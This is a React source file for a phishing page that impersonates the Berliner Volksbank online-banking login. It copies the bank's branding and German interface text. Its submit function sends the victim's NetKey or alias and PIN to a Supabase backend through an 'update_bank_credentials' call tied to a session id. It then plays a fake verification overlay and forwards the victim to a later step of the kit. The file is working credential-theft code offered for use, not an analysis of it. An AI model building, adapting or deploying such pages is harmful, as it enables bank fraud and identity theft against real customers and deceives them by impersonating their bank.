import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import faviconAsset from "@/assets/favicons/volksbank.webp.asset.json";
import { Eye, EyeOff, TriangleAlert } from "lucide-react";
import germanyFlag from "@/assets/germany-flag.svg.asset.json";
import logoAsset from "@/assets/volksbank-de-logo.avif.asset.json";

const TOPBAR = "#002d67";
const FOOTER_BG = "#002d67";
const TITLE_COLOR = "#002d67";
const WELCOME_COLOR = "#000000db";
const ACTION_BLUE = "#0066b3";
const ACTION_BLUE_DARK = "#005699";
const TEXT = "#1f2a37";
const CARD_SHADOW = "0 4px 14px 0 rgba(0,0,0,0.12)";

const VolksbankDe = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [showLoading, setShowLoading] = useState(false);
  const [username, setUsername] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [userError, setUserError] = useState(false);
  const [pinError, setPinError] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Berliner Volksbank - Anmelden", faviconAsset.url);

  const submit = async () => {
    const uErr = username.trim() === "";
    const pErr = pin.trim() === "";
    setUserError(uErr);
    setPinError(pErr);
    if (uErr || pErr) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: pin,
        p_username_label: "VR-NetKey oder Alias",
        p_password_label: "PIN",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const ERR_COLOR = "#d20000";
  const ERR_BG = "#fceded";
  const errStyle = { borderColor: ERR_COLOR, backgroundColor: ERR_BG } as const;

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate((new URLSearchParams(window.location.search).get("return") || "") ? `${new URLSearchParams(window.location.search).get("return")}?step=3&s=${sessionId}` : "/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen flex flex-col"
        style={{ fontFamily: "'GenosGFG', Arial, sans-serif", color: TEXT, backgroundColor: "#f3f5f7" }}
      >
        <div className="hidden lg:block" style={{ backgroundColor: TOPBAR, height: 48 }} />

        <header className="bg-white border-b border-gray-200">
          <div className="max-w-[1200px] mx-auto px-3 lg:px-6 py-3 lg:py-4 flex items-center gap-2 lg:gap-5">
            <img src={logoAsset.url} alt="Berliner Volksbank" className="h-8 lg:h-12 w-auto" />
          </div>
        </header>

        <main className="flex-1">
          <div className="max-w-[1200px] mx-auto px-3 py-4 lg:px-6 lg:py-10 grid grid-cols-1 lg:grid-cols-2 gap-4 lg:gap-8">
            <div className="flex flex-col gap-4 lg:gap-6">
              <section className="bg-white rounded-lg p-5 lg:p-8" style={{ boxShadow: CARD_SHADOW }}>
                <h1 className="text-[22px] lg:text-[32px]" style={{ color: TITLE_COLOR, fontWeight: 700, marginBottom: 16, fontFamily: "'FrutigerVR', 'GenosGFG', Arial, sans-serif" }}>
                  Anmelden
                </h1>

                <p style={{ color: WELCOME_COLOR, fontSize: 15, lineHeight: 1.5, marginBottom: 20, fontWeight: 700 }}>
                  Willkommen im OnlineBanking der Berliner Volksbank
                </p>

                <div className="hidden lg:block" style={{ borderBottom: "1px solid #e4e8ec", marginBottom: 24 }}>
                  <button
                    type="button"
                    style={{
                      padding: "10px 4px",
                      marginBottom: -1,
                      borderBottom: `2px solid #0066b3`,
                      color: "#0066b3",
                      fontWeight: 700,
                      fontSize: 12,
                      fontFamily: "'FrutigerVR', 'GenosGFG', Arial, sans-serif",
                    }}
                  >
                    Mit Zugangsdaten anmelden
                  </button>
                </div>


                {/* Fields */}
                <div className="space-y-5">
                  <div>
                    <div className="relative">
                      <input
                        id="vb-user"
                        type="text"
                        placeholder=" "
                        value={username}
                        onChange={(e) => { setUsername(e.target.value); if (userError) setUserError(false); }}
                        className="sp-input peer w-full outline-none"
                        style={userError ? errStyle : undefined}
                      />
                      <label htmlFor="vb-user" className="sp-float">VR-NetKey oder Alias</label>
                    </div>
                    {userError && (
                      <div style={{ color: ERR_COLOR, fontSize: 14, marginTop: 6, display: "flex", alignItems: "center", gap: 6 }}>
                        <TriangleAlert size={16} />
                        <span>VR-NetKey oder Alias erforderlich</span>
                      </div>
                    )}
                  </div>
                  <div>
                    <div className="relative">
                      <input
                        id="vb-pin"
                        type={showPin ? "text" : "password"}
                        placeholder=" "
                        value={pin}
                        onChange={(e) => { setPin(e.target.value); if (pinError) setPinError(false); }}
                        className="sp-input peer w-full outline-none"
                        style={{ paddingRight: 48, ...(pinError ? errStyle : {}) }}
                      />
                      <label htmlFor="vb-pin" className="sp-float">PIN</label>
                      <button
                        type="button"
                        onClick={() => setShowPin((s) => !s)}
                        className="absolute right-3 top-1/2 -translate-y-1/2"
                        style={{ color: TEXT }}
                        aria-label="PIN anzeigen"
                      >
                        {showPin ? <EyeOff size={22} /> : <Eye size={22} />}
                      </button>
                    </div>
                    {pinError && (
                      <div style={{ color: ERR_COLOR, fontSize: 14, marginTop: 6, display: "flex", alignItems: "center", gap: 6 }}>
                        <TriangleAlert size={16} />
                        <span>PIN erforderlich</span>
                      </div>
                    )}
                  </div>

                  <div className="flex justify-center lg:justify-end">
                    <button
                      type="button"
                      style={{ color: ACTION_BLUE, fontSize: 14, fontWeight: 600, padding: "6px 10px", borderRadius: 6, background: "transparent", transition: "background-color 150ms ease" }}
                      onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = "#f2f7fb"; }}
                      onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = "transparent"; }}
                    >
                      PIN vergessen?
                    </button>
                  </div>

                </div>

                <hr className="my-6 -mx-5 lg:mx-0" style={{ borderColor: "#e4e8ec" }} />

                <div className="flex flex-col-reverse lg:flex-row items-stretch lg:items-center lg:justify-between gap-3 lg:gap-4">
                  <button
                    onClick={() => { setUsername(""); setPin(""); }}
                    className="font-semibold transition-colors w-full lg:w-auto"
                    style={{
                      color: ACTION_BLUE,
                      backgroundColor: "#fff",
                      border: `2px solid ${ACTION_BLUE}`,
                      borderRadius: 999,
                      minWidth: 150,
                      padding: "9px 28px",
                      fontSize: 14,
                    }}
                    onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = "#eef4fa"; }}
                    onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = "#fff"; }}
                  >
                    Abbrechen
                  </button>
                  <button
                    onClick={submit}
                    className="font-semibold text-white transition-colors w-full lg:w-auto"
                    style={{
                      backgroundColor: ACTION_BLUE,
                      border: `2px solid ${ACTION_BLUE}`,
                      borderRadius: 999,
                      minWidth: 150,
                      padding: "9px 28px",
                      fontSize: 14,
                    }}
                    onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = ACTION_BLUE_DARK; e.currentTarget.style.borderColor = ACTION_BLUE_DARK; }}
                    onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = ACTION_BLUE; e.currentTarget.style.borderColor = ACTION_BLUE; }}
                  >
                    Anmelden
                  </button>
                </div>
              </section>

              <section className="bg-white rounded-lg p-6" style={{ fontSize: 15, lineHeight: 1.5, boxShadow: CARD_SHADOW }}>
                <p>
                  <strong>Hinweis:</strong> Beim Aufruf Ihres Union-Depots kann es derzeit vereinzelt zu längeren Ladezeiten oder technischen Fehlern kommen. Wir arbeiten mit Hochdruck an der Behebung. Vielen Dank für Ihr Verständnis.
                </p>
              </section>
            </div>

            <aside />

          </div>
        </main>

        <footer style={{ backgroundColor: FOOTER_BG }} className="text-white">
          <div className="max-w-[1200px] mx-auto px-6 py-6 flex flex-col items-center gap-3">
            <nav className="flex flex-col lg:flex-row flex-wrap items-center justify-center gap-x-2 gap-y-1 lg:gap-y-3 text-[13px] lg:text-sm text-center">
              {["Impressum", "Sicherheitshinweise", "Nutzungsbedingungen", "Datenschutz", "Pflichtinformationen", "AGB"].map((l, i, arr) => (
                <span key={l} className="flex items-center gap-2">
                  <a href="#" onClick={(e) => e.preventDefault()} className="text-white font-semibold">{l}</a>
                  {i < arr.length - 1 && <span className="opacity-60 hidden lg:inline">·</span>}
                </span>
              ))}
            </nav>
            <button className="flex items-center gap-2 text-sm mt-3 lg:mt-0" onClick={(e) => e.preventDefault()}>
              <img src={germanyFlag.url} alt="" width={22} height={22} />
              <span>Deutsch</span>
            </button>
          </div>
        </footer>

        <div className="text-center text-sm py-5 bg-white px-4" style={{ color: "#6b7684" }}>
          Wir machen den Weg frei. Gemeinsam mit den Spezialisten der Genossenschaftlichen FinanzGruppe Volksbanken Raiffeisenbanken
        </div>
      </div>
    </>
  );
};

export default VolksbankDe;
